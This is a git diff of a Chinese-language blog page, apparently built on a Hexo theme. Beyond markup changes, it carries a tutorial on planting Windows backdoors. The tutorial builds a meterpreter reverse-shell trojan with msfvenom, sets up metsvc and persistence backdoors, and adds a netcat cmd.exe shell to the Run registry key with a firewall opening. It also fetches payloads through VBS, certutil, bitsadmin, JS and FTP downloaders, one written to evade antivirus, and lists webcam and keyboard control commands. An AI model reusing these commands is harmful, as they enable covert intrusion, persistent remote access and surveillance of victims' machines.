@@ -8,7 +8,7 @@
     <meta name="description" content="认识系统后门meterpreter创建系统后门
 创建x64木马
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe &amp;">
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe &gt;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -234,75 +234,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
         </li>
         
         
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
     </ul>
 </div>
 
 
         </div>
 
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
     </nav>
 
@@ -483,7 +420,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.3k
                 </div>
                 
 
@@ -508,12 +445,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
                 <h1 id="认识系统后门"><a href="#认识系统后门" class="headerlink" title="认识系统后门"></a>认识系统后门</h1><h2 id="meterpreter创建系统后门"><a href="#meterpreter创建系统后门" class="headerlink" title="meterpreter创建系统后门"></a>meterpreter创建系统后门</h2><ol>
 <li>创建x64木马</li>
 </ol>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe &gt; msf.exe
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe > msf.exe
 </code></pre>
 <ol start="2">
 <li>生成木马后，放到桌面上。</li>
 </ol>
-<pre><code>use exploit/multi/handler
+<pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handler
 set payload windows/metsvc_bind_tcp
 show options
 set lport 192.168.1.120
@@ -523,13 +460,13 @@ exploit
 <ol start="3">
 <li><strong>通过服务启动</strong>：</li>
 </ol>
-<pre><code>run metsvc -A    # 设定端口上传后门文件
+<pre class=" language-Linux"><code class="language-Linux">run metsvc -A    # 设定端口上传后门文件
 </code></pre>
 <p>【会开启一个31337端口，然后木马存在于C:\Users\ADMINI~1\APPData\Local\Teemp\FWnOkowKpbzilqs】</p>
 <ol start="4">
 <li><strong>如何利用后门</strong>:</li>
 </ol>
-<pre><code>use exploit/multi/handler
+<pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handler
 set payload windows/metsvc_bind_tcp
 set lport 31337
 set rhost [对方的ip]
@@ -537,7 +474,7 @@ exploit
 </code></pre>
 <ol start="5">
 <li><p><strong>或</strong>：<strong>在session中启动利用后门</strong></p>
-<pre><code>run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
+<pre class=" language-Linux"><code class="language-Linux">run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
 # 安插一个永久性后门，60s上线一次，使用4321端口
 
 sessions
@@ -555,7 +492,7 @@ getuid
 </li>
 </ol>
 <p>【如果msf关闭了，下次重开】</p>
-<pre><code>use multi/handler
+<pre class=" language-Linux"><code class="language-Linux">use multi/handler
 set payload windows/meterpreter/reverse_tcp
 set lport 4321
 set lhost [自己ip]
@@ -568,27 +505,27 @@ exploit
 <h2 id="利用上传文件安插后门："><a href="#利用上传文件安插后门：" class="headerlink" title="利用上传文件安插后门："></a>利用上传文件安插后门：</h2><p>安插木马后</p>
 <p>利用nc：</p>
 <p>进入一个session中：</p>
-<pre><code>upload /root/nc.exe c:\\
+<pre class=" language-Linux"><code class="language-Linux">upload /root/nc.exe c:\\
 </code></pre>
 <p>查看注册表里有什么：</p>
-<pre><code>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+<pre class=" language-Linux"><code class="language-Linux">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 </code></pre>
 <p>把nc放到自动启动里：</p>
-<pre><code>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;c:\nc.exe -Ldp 444 -e cmd.exe&#39;
+<pre class=" language-Linux"><code class="language-Linux">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\nc.exe -Ldp 444 -e cmd.exe'
 </code></pre>
 <p>查看代码写的对不对：</p>
-<pre><code>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
+<pre class=" language-Linux"><code class="language-Linux">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
 </code></pre>
 <p>查看防火墙状态：</p>
-<pre><code>shell
+<pre class=" language-Linux"><code class="language-Linux">shell
 netsh firewall show opmode
 </code></pre>
 <p>添加一个防火墙规则允许444端口通过：</p>
-<pre><code>sh
-netsh firewall add portopening TCP 444 &quot;FireWall&quot; ENABLE ALL
+<pre class=" language-Linux"><code class="language-Linux">sh
+netsh firewall add portopening TCP 444 "FireWall" ENABLE ALL
 </code></pre>
 <p>目标主机重启之后：</p>
-<pre><code>nc -v [目标ip] 444
+<pre class=" language-Linux"><code class="language-Linux">nc -v [目标ip] 444
 </code></pre>
 <p>然后即可连接上。</p>
 <h2 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h2><p>注册表修改的内容可以在msconfig的启动选项卡里看到<br>可以考虑使用自解压的方法进行伪装…</p>
@@ -596,80 +533,80 @@ netsh firewall add portopening TCP 444 &quot;FireWall&quot; ENABLE ALL
 <p><strong>下载的本质</strong>：把对方服务器上所存放的二进制代码原封不动地根据http 协议或其他协议复制到自己的硬盘上。</p>
 <h2 id="使用vbs去远程下载文件"><a href="#使用vbs去远程下载文件" class="headerlink" title="使用vbs去远程下载文件:"></a>使用vbs去远程下载文件:</h2><p>比如在自己网页上创建一个haha.txt文件当作木马。</p>
 <p>创建一个a.vbs：</p>
-<pre><code>set a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
+<pre class=" language-vbscript"><code class="language-vbscript">set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
 
-# 创建对象a【&quot;adod&quot;+&quot;b.stream&quot;等同于adodb.stream，拆分是为了免杀】
+# 创建对象a【"adod"+"b.stream"等同于adodb.stream，拆分是为了免杀】
 # get传输
 # 参数为0
 # 表示下载0，保存到1的地方
 </code></pre>
 <p>cmd运行：</p>
-<pre><code>cscript a.vbs http://www.xx.com/haha.txt c:\b.txt
-cscript a.vbs [参数0：http://www.xx.com/haha.txt] [参数1：c:\b.txt]
-# 下载0保存到1
+<pre class=" language-bash"><code class="language-bash">cscript a.vbs http://www.xx.com/haha.txt c:\b.txt
+cscript a.vbs <span class="token punctuation">[</span>参数0：http://www.xx.com/haha.txt<span class="token punctuation">]</span> <span class="token punctuation">[</span>参数1：c:\b.txt<span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true"># 下载0保存到1</span>
 </code></pre>
 <p>或cmd使用echo直接写：</p>
-<pre><code>echo set a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; a.vbs
+<pre class=" language-Linux"><code class="language-Linux">echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> a.vbs
 </code></pre>
 <p>容易被杀毒软件查到</p>
-<h2 id="cmd-certutil下载文件："><a href="#cmd-certutil下载文件：" class="headerlink" title="cmd,certutil下载文件："></a>cmd,certutil下载文件：</h2><pre><code>certutil -urlcache -split -f http://www.xx.com/haha.txt
+<h2 id="cmd-certutil下载文件："><a href="#cmd-certutil下载文件：" class="headerlink" title="cmd,certutil下载文件："></a>cmd,certutil下载文件：</h2><pre class=" language-Linux"><code class="language-Linux">certutil -urlcache -split -f http://www.xx.com/haha.txt
 
 # 会下载到本目录
 </code></pre>
 <p>有一个弊端：<br>每次下载的时候，都有留存，导致留下入侵痕迹，所以每次下载之后，都要清理痕迹:</p>
-<pre><code>certutil -urlcache -split -f http://www.xx.com/haha.txt delete
+<pre class=" language-Linux"><code class="language-Linux">certutil -urlcache -split -f http://www.xx.com/haha.txt delete
 </code></pre>
 <p>除了下载文件还可以校验hash值：</p>
-<pre><code>certutil -hashfile c:\xxx.exe
+<pre class=" language-Linux"><code class="language-Linux">certutil -hashfile c:\xxx.exe
 </code></pre>
 <p>如果文件被动过，hash值就会改变</p>
 <p>除了下载文件还可以加密解密文件：</p>
-<pre><code>certutil -encode c:\haha.txt c:\haha-en.txt
+<pre class=" language-Linux"><code class="language-Linux">certutil -encode c:\haha.txt c:\haha-en.txt
 certutil -decode c:\haha-en.txt c:\haha-de.txt
 </code></pre>
 <h2 id="使用cmd-bitsadmin下载："><a href="#使用cmd-bitsadmin下载：" class="headerlink" title="使用cmd,bitsadmin下载："></a>使用cmd,bitsadmin下载：</h2><p>下载主命令：</p>
-<pre><code>bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt
+<pre class=" language-Linux"><code class="language-Linux">bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt
 </code></pre>
 <p>提高下载主命令的优先级（下载大型文件）:</p>
-<pre><code>bitsadmin /setpriority down foreground
+<pre class=" language-Linux"><code class="language-Linux">bitsadmin /setpriority down foreground
 </code></pre>
 <h2 id="使用js下载："><a href="#使用js下载：" class="headerlink" title="使用js下载："></a>使用js下载：</h2><p>创建一个a.js</p>
-<pre><code>var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-WinHttpReq.Open(&quot;GET&quot;,WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();  # 发送请求
-WScript.Echo(WinHttpReq.ResponseText);  # 返回
+<pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  # 发送请求
+WScript<span class="token punctuation">.</span><span class="token function">Echo</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseText<span class="token punctuation">)</span><span class="token punctuation">;</span>  # 返回
 
 # 然后cmd：
-cscript /nologo a.js http://www.xx.com/haha.txt &gt;&gt; 123.txt
+cscript <span class="token operator">/</span>nologo a<span class="token punctuation">.</span>js http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token operator">/</span>haha<span class="token punctuation">.</span>txt <span class="token operator">></span><span class="token operator">></span> <span class="token number">123</span><span class="token punctuation">.</span>txt
 # 适用于下载脚本
 </code></pre>
 <p>创建一个a.js下载后直接保存为文件:</p>
-<pre><code>var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-WinHttpReq.Open(&quot;GET&quot;,WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();
-BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
-BinStream.Type = 1;
-BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);
-BinStream.SaveToFile(&quot;abc.exe&quot;);
+<pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BinStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"ADODB.Stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BinStream<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+BinStream<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>
+BinStream<span class="token punctuation">.</span><span class="token function">SaveToFile</span><span class="token punctuation">(</span><span class="token string">"abc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 # cmd：
-cscript /nologo a.js http://www.xx.com/aa.exe
+cscript <span class="token operator">/</span>nologo a<span class="token punctuation">.</span>js http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token operator">/</span>aa<span class="token punctuation">.</span>exe
 </code></pre>
 <p>较可靠</p>
 <h2 id="使用ftp脚本"><a href="#使用ftp脚本" class="headerlink" title="使用ftp脚本:"></a>使用ftp脚本:</h2><p>创建一个a.bat</p>
-<pre><code>echo open [黑客ip] &gt; ftp.txt
-echo test&gt;&gt;ftp.txt
-echo 123&gt;&gt;ftp.txt
-echo binary&gt;&gt; ftp.txt
-echo get haha.txt&gt;&gt; ftp.txt
-echo bye &gt;&gt; ftp.txt
+<pre class=" language-Linux"><code class="language-Linux">echo open [黑客ip] > ftp.txt
+echo test>>ftp.txt
+echo 123>>ftp.txt
+echo binary>> ftp.txt
+echo get haha.txt>> ftp.txt
+echo bye >> ftp.txt
 </code></pre>
 <p>创建一个haha.txt</p>
-<pre><code>*CODE:\
+<pre class=" language-Linux"><code class="language-Linux">*CODE:\
 </code></pre>
 <p>双击bat文件会得到一个txt文件。</p>
 <p>然后再cmd里把得到的txt文件内容当作一个脚本去执行：</p>
-<pre><code>ftp -s:ftp.txt
+<pre class=" language-Linux"><code class="language-Linux">ftp -s:ftp.txt
 </code></pre>
-<h2 id="kali的meterpreter其他命令："><a href="#kali的meterpreter其他命令：" class="headerlink" title="kali的meterpreter其他命令："></a>kali的meterpreter其他命令：</h2><pre><code>uictl [enable/disable] [keyboard/mouse/all]   # 开启/停用键盘/鼠标
+<h2 id="kali的meterpreter其他命令："><a href="#kali的meterpreter其他命令：" class="headerlink" title="kali的meterpreter其他命令："></a>kali的meterpreter其他命令：</h2><pre class=" language-Linux"><code class="language-Linux">uictl [enable/disable] [keyboard/mouse/all]   # 开启/停用键盘/鼠标
 
 webcam_list    # 查看摄像头
 webcam_snap    # 通过摄像头拍照
@@ -1445,16 +1382,20 @@ $(function () {
     
 
     <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
     
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
 
+	
     <!-- 鼠标星星特效 -->
     
 
